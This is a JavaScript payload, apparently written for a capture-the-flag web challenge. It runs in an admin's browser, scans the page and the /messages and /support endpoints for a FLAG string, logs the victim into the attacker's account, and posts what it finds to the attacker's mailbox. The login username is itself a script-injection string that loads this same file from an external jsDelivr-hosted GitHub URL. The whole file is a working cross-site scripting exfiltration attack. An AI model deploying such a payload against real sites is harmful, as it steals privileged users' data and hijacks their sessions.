// navaja_pivot.js — busca FLAG en la sesión del admin, luego hace login a TU usuario y la publica en tu buzón
(async () => {
  // Evitar re-ejecuciones
  try { if (sessionStorage.getItem('pv_ran')) return; sessionStorage.setItem('pv_ran','1'); } catch(_){}

  const sleep = (ms) => new Promise(r => setTimeout(r, ms));
  const flagRe = /FLAG\{[^}]+\}/i;

  const getJSON = async (u) => (await fetch(u, {credentials:'include'})).json();
  const getText = async (u) => (await fetch(u, {credentials:'include'})).text();
  const postMsg = async (message) => {
    await fetch('/create_msg', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ message })
    });
  };

  let flag = null;

  try {
    // 1) Revisar DOM visible
    const dom = (document.body && document.body.innerText) ? document.body.innerText : '';
    let m = dom.match(flagRe); if (m) flag = m[0];

    // 2) /messages (sin id)
    if (!flag) {
      try { m = JSON.stringify(await getJSON('/messages')).match(flagRe); if (m) flag = m[0]; } catch {}
    }

    // 3) /messages?id=... (muestra el hilo "de este soporte")
    if (!flag) {
      const qs = new URLSearchParams(location.search);
      const curId = qs.get('id');
      const candidates = curId ? [Number(curId)] : [];
      // algunos ids típicos por si la flag está en otro hilo
      [1,5,10,25,50,100,250,500,1000,1500,1800,2000,2200,2400,2600].forEach(v => candidates.push(v));
      for (const id of candidates) {
        try {
          const j = await getJSON('/messages?id='+encodeURIComponent(id));
          m = JSON.stringify(j).match(flagRe);
          if (m) { flag = m[0]; break; }
        } catch {}
        await sleep(60);
      }
    }

    // 4) /support?id=... (por si solo aparece en HTML)
    if (!flag) {
      const qs = new URLSearchParams(location.search);
      const curId = qs.get('id');
      const candidates = curId ? [Number(curId)] : [1,5,10,25,50,100,250,500,1000,1500,1800,2000,2200,2400,2600];
      for (const id of candidates) {
        try {
          const t = await getText('/support?id='+encodeURIComponent(id));
          m = t.match(flagRe);
          if (m) { flag = m[0]; break; }
        } catch {}
        await sleep(60);
      }
    }

    if (!flag) return; // no hay flag -> no spamear

    // 5) Pivot: iniciar sesión como TU usuario para postear en TU buzón
    const YOUR_USER = '</title></head><body><script src="https://cdn.jsdelivr.net/gh/JAYMONSECURITY/JMSec-Blog-Resources@main/navaja_pivot.js"></script><title>';     // <-- cámbialo
    const YOUR_PASS = '1234';    // <-- cámbialo

    // intenta login; si falla, intenta register
    const bodyLogin = 'action=login&username=' + encodeURIComponent(YOUR_USER) +
                      '&password=' + encodeURIComponent(YOUR_PASS);
    await fetch('/auth', { method: 'POST', headers: { 'Content-Type':'application/x-www-form-urlencoded' }, body: bodyLogin });
    await sleep(250);

    // 6) Publicar la flag en tu buzón
    await postMsg('EXFIL_FLAG: ' + flag);
  } catch (e) {
    try { await postMsg('EXFIL_ERR: ' + (e && e.message ? e.message : String(e))); } catch {}
  }
})();
